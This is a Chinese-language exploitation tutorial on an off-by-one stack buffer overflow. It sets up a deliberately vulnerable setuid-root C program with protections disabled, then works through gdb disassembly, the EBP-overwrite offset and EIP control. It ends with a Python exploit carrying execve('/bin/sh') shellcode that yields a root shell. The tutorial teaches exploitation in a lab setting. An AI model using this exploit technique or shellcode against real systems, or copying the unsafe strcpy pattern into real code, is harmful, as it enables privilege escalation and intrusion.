## Off-By-One Vulnerability

​	off-by-one漏洞是由于源字符串复制到目标缓冲区时，由于源字符串长度等于目标缓冲区长度，将在目标缓冲区上方复制一个NULL字节。由于目标缓冲区位于堆栈中，单个NULL字节可能会覆盖在堆栈中的调用方EBP的最低有效位（LSB），进而可能导致任意代码执行。

​	存在漏洞代码：

```c
//vuln.c
# include <stdio.h>
# include <string.h>

void foo(char* arg);
void bar(char* arg);
void foo(char* arg) {
	bar(arg); /* [1] */
}

void bar(char* arg) {
	char buf[256];
	strcpy(buf, arg); /* [2] */
}

int main(int argc, char *argv[]) {
	if(strlen(argv[1])>256) { /* [3] */
        printf("Attempted Buffer Overflow\n");
        fflush(stdout);
        return -1;
    }
    foo(argv[1]); /* [4] */
    return 0;
}
```

​	编译代码(禁用ASLR；关闭栈保护；标记堆栈为可执行； 4 字节边界上对齐堆栈指针; ELF文件执行时获得root权限)：

```shell
#echo 0 > /proc/sys/kernel/randomize_va_space
$gcc -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o vuln vuln.c
$sudo chown root vuln
$sudo chgrp root vuln
$sudo chmod +s vuln
```

​	上述代码的第[2]行处可能存在off-by-one漏洞。**可以使用`"EBP overwrite"`的技术来实现任意代码执行。如果调用者的EBP位于目标缓冲区的正上方，则在执行strcpy函数后，单个NULL字节将覆盖调用者的LSB。**

​	反汇编代码：

```
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048497 <+0>:	push   %ebp
   0x08048498 <+1>:	mov    %esp,%ebp
   0x0804849a <+3>:	push   %edi
   0x0804849b <+4>:	sub    $0x8,%esp				//create stack space
   0x0804849e <+7>:	mov    0xc(%ebp),%eax
   0x080484a1 <+10>:	add    $0x4,%eax
   0x080484a4 <+13>:	mov    (%eax),%eax
   0x080484a6 <+15>:	movl   $0xffffffff,-0x8(%ebp)
   0x080484ad <+22>:	mov    %eax,%edx
   0x080484af <+24>:	mov    $0x0,%eax
   0x080484b4 <+29>:	mov    -0x8(%ebp),%ecx
   0x080484b7 <+32>:	mov    %edx,%edi
   0x080484b9 <+34>:	repnz scas %es:(%edi),%al
   0x080484bb <+36>:	mov    %ecx,%eax
   0x080484bd <+38>:	not    %eax
   0x080484bf <+40>:	sub    $0x1,%eax
   0x080484c2 <+43>:	cmp    $0x100,%eax
   0x080484c7 <+48>:	jbe    0x80484e9 <main+82>
   0x080484c9 <+50>:	movl   $0x80485e0,(%esp)
   0x080484d0 <+57>:	call   0x8048380 <puts@plt>
   0x080484d5 <+62>:	mov    0x804a020,%eax
   0x080484da <+67>:	mov    %eax,(%esp)
   0x080484dd <+70>:	call   0x8048360 <fflush@plt>
   0x080484e2 <+75>:	mov    $0xffffffff,%eax
   0x080484e7 <+80>:	jmp    0x80484fe <main+103>
   0x080484e9 <+82>:	mov    0xc(%ebp),%eax
   0x080484ec <+85>:	add    $0x4,%eax
   0x080484ef <+88>:	mov    (%eax),%eax
   0x080484f1 <+90>:	mov    %eax,(%esp)
   0x080484f4 <+93>:	call   0x8048464 <foo>			//call foo
   0x080484f9 <+98>:	mov    $0x0,%eax				//return value
   0x080484fe <+103>:	add    $0x8,%esp
   0x08048501 <+106>:	pop    %edi
   0x08048502 <+107>:	pop    %ebp
   0x08048503 <+108>:	ret    
End of assembler dump.

(gdb) disassemble foo
Dump of assembler code for function foo:
   0x08048464 <+0>:	push   %ebp
   0x08048465 <+1>:	mov    %esp,%ebp
   0x08048467 <+3>:	sub    $0x4,%esp			//create stack space
   0x0804846a <+6>:	mov    0x8(%ebp),%eax		//foo arg
   0x0804846d <+9>:	mov    %eax,(%esp)			//bar arg = foo arg
   0x08048470 <+12>:	call   0x8048477 <bar>   //call bar
   0x08048475 <+17>:	leave  
   0x08048476 <+18>:	ret    
End of assembler dump.

(gdb) disassemble bar 
Dump of assembler code for function bar:
   0x08048477 <+0>:	push   %ebp
   0x08048478 <+1>:	mov    %esp,%ebp			
   0x0804847a <+3>:	sub    $0x108,%esp			//create stack space
   0x08048480 <+9>:	mov    0x8(%ebp),%eax
   0x08048483 <+12>:	mov    %eax,0x4(%esp)
   0x08048487 <+16>:	lea    -0x100(%ebp),%eax	//buf
   0x0804848d <+22>:	mov    %eax,(%esp)			//strcpy args
   0x08048490 <+25>:	call   0x8048370 <strcpy@plt> //call strcpy
   0x08048495 <+30>:	leave  
   0x08048496 <+31>:	ret    
End of assembler dump.

```

​	分析反汇编代码，其堆栈结构为：

```
高地址				  
					main's ebp
					stack space
					return address
					foo's ebp		---------------> overflow LSB
					buf_end
					...			    ---------------> shellcode here
					buf_start
					...
					esp
低地址
```

​	因此，当用户输入256字节的数据时，NULL字节将会覆盖foo函数的EBP的LSB。当原本foo函数的ebp为0xbffffd2c，则将会被更改为0xbffffd00。当栈地址0xbffffd00位于buf缓冲区时，攻击者即可控制该地址后的返回地址(0xbffffd04)，从而达到控制EIP实现任意代码执行。

​	首先测试是否可以溢出EBP并因此覆盖返回地址，如下输出显示可以控制EIP：

```
(gdb) r `python -c 'print "A"*256'`
Starting program: /home/user/projects/.launcher `python -c 'print "A"*256'`

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) p/x $eip
$1 = 0x41414141
```

​	接下来计算目标缓冲区的偏移量大小。该偏移量是距离buf缓冲区开头的偏移量，需要写入我们的返回地址。查看栈空间，可以看到buf_start的地址为`0xbffffc28`，foo's ebp的值被更改为了`0xbffffd00`, 因此对应的返回地址为`0xbffffd04`。所以**偏移量**为：`0xbffffd04-0xbffffc28=0xdc`。栈空间如下所示：

```
(gdb) x/92x 0xbffffc20
0xbffffc20:	0xbffffc28	0xbffffeca	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc50:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc60:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc70:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc80:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc90:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffca0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcc0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcd0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffce0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcf0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffd00:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffd10:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffd20:	0x41414141	0x41414141	0xbffffd00	0x08048475
```

​	因此，可以输入`"A"*220 + "B"*4 + "C"*32`的数据进行验证：

```
(gdb) r `python -c 'print "A"*220 + "B"*4 + "C"*32'`
Starting program: /home/user/projects/vuln `python -c 'print "A"*220 + "B"*4 + "C"*32'`

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

​	结果表明成功用`BBBB`覆盖了`0xbffffd04`处的返回地址。编写利用代码：

```python
# exp.py
# !/usr/bin/env python
import struct
from subprocess import call

# Spawn a shell.
# execve(/bin/sh) Size- 28 bytes.
scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90"

ret_addr = 0xbffffd08

#endianess conversion
def conv(num):
    return struct.pack("<I",num)

#Junk + Return Address + NOP's + Shellcode
buf = "A" * 220
buf += conv(ret_addr)
buf += "\x90" * 4
buf += scode

print "Calling vulnerable program"
call(["/home/user/projects/vuln", buf])
```

​	执行exploit得到了root shell，如下所示：

```
user@ubuntu:~/projects$ python exp.py
Calling vulnerable program
# whoami
root
```

